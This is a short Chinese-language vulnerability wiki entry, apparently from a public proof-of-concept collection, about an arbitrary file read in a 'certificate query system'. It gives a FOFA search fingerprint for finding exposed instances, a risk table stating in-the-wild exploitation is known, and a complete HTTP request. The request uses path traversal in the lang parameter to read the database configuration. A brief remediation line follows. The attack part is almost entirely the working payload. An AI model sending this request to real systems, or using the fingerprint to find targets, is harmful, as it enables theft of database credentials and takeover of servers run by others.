---
fofa: "/index/js/jquery.uls.data.js"
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 证书系统查询系统lang任意文件读取漏洞

# 漏洞描述

证书系统查询系统lang任意文件读取漏洞，可读取数据库配置文件导致数据泄露，系统被控制，危害极大。

# 影响版本

证书系统查询系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA："/index/js/jquery.uls.data.js"

POC/EXP：

GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9

![image-20241105224411060](./.resource/证书系统查询系统lang任意文件读取漏洞/media/image-20241105224411060.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
